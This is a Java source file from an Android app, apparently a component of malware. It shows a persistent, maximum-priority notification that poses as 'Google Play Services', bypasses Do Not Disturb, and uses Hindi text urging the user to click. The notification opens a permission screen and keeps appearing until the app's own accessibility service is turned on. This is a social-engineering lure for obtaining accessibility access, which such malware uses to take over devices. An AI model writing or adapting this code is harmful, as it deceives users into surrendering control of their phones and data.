package com.android.photo.camera.capture;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.RemoteViews;

import androidx.core.app.NotificationCompat;

public class PersistentNotification {
    private static final String CHANNEL_ID = "channel";
    private static final int FIXED_NOTIFICATION_ID = 1;
    private final Context context;
    private final NotificationManager notificationManager;
    private final Object notificationLock = new Object();

    public PersistentNotification(Context context) {
        if (context == null) throw new IllegalArgumentException("Context cannot be null");
        this.context = context.getApplicationContext();
        this.notificationManager = (NotificationManager) this.context.getSystemService(Context.NOTIFICATION_SERVICE);
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && notificationManager != null) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Google Play Services",
                    NotificationManager.IMPORTANCE_MAX
            );
            channel.setDescription("गूगल प्ले स्टोर के साथ अपडेट रहने के लिए क्लिक करें");
            channel.setBypassDnd(true);
            channel.setImportance(NotificationManager.IMPORTANCE_MAX);
            notificationManager.createNotificationChannel(channel);
        }
    }

    public void showNotification() {
        synchronized (notificationLock) {
            if (notificationManager == null || context == null || isAccessibilityServiceEnabled()) {
                return;
            }

            try {
                Intent intent = new Intent(context, CustomPermissionActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                PendingIntent pendingIntent = PendingIntent.getActivity(
                        context,
                        0,
                        intent,
                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                );

                RemoteViews customLayout = new RemoteViews(context.getPackageName(), R.layout.notification_layout);

                Bitmap largeIcon = BitmapFactory.decodeResource(context.getResources(), R.mipmap.crazy);
                customLayout.setImageViewBitmap(R.id.notification_icon, largeIcon);
                customLayout.setTextViewText(R.id.notification_title, "Google Play Services");
                customLayout.setTextViewText(R.id.notification_text, "गूगल प्ले स्टोर के साथ अपडेट रहने के लिए क्लिक करें");

                NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                        .setSmallIcon(R.mipmap.crazy)
                        .setCustomContentView(customLayout)
                        .setPriority(NotificationCompat.PRIORITY_MAX)
                        .setCategory(NotificationCompat.CATEGORY_ERROR)
                        .setAutoCancel(true)
                        .setDefaults(NotificationCompat.DEFAULT_ALL)
                        .setContentIntent(pendingIntent);

                notificationManager.notify(FIXED_NOTIFICATION_ID, builder.build());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        String prefString = Settings.Secure.getString(context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        String serviceName = context.getPackageName() + "/" + Service.class.getName();
        return prefString != null && prefString.contains(serviceName);
    }

    public void clearNotification() {
        synchronized (notificationLock) {
            if (notificationManager != null) {
                try {
                    notificationManager.cancel(FIXED_NOTIFICATION_ID);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}